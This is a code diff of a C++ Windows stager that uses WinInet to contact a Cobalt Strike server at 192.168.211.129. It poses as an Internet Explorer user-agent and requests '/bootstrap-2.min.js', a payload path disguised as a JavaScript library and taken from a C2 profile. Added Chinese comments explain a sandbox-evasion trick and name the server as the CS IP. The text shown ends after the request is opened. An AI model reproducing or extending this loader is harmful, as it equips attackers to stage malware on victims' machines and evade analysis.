@@ -1,24 +1,24 @@
-﻿//#include <iostream>
+//#include <iostream>
 #include <Windows.h>
 #include <stdio.h>
 #include <WinInet.h>
 //using namespace std;
 #pragma comment(lib,"wininet")
 int main(int argc,char* argv[]){
-    //if (argc > 1) {
-        HINTERNET nethandle = InternetOpenA("Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",INTERNET_OPEN_TYPE_DIRECT,NULL,NULL, INTERNET_FLAG_ASYNC);
+    //if (argc > 1) {//通过传入参数绕过沙箱
+        HINTERNET nethandle = InternetOpenA("Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",INTERNET_OPEN_TYPE_DIRECT,NULL,NULL, INTERNET_FLAG_ASYNC);//user-agent可以修改
         if (nethandle == NULL) {
             printf("internet open error:%d\n", GetLastError());
             return 0;
         }
-        char* host = (char*)"192.168.211.129";
+        char* host = (char*)"192.168.211.129";//cs的ip
         HINTERNET Session = InternetConnectA(nethandle, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
         if (Session==NULL)
         {
             printf("internet connect error:%d\n", GetLastError());
             return 0;
         }
-        HINTERNET HttpRequest = HttpOpenRequestA(Session, "GET", "/bootstrap-2.min.js", "HTTP/1.0", NULL, NULL, INTERNET_FLAG_DONT_CACHE, 0);
+        HINTERNET HttpRequest = HttpOpenRequestA(Session, "GET", "/bootstrap-2.min.js", "HTTP/1.0", NULL, NULL, INTERNET_FLAG_DONT_CACHE, 0);//通过get请求profile文件中的url地址
         if (HttpRequest == NULL) {
             printf("http open request error:%d\n", GetLastError());
             return 0;
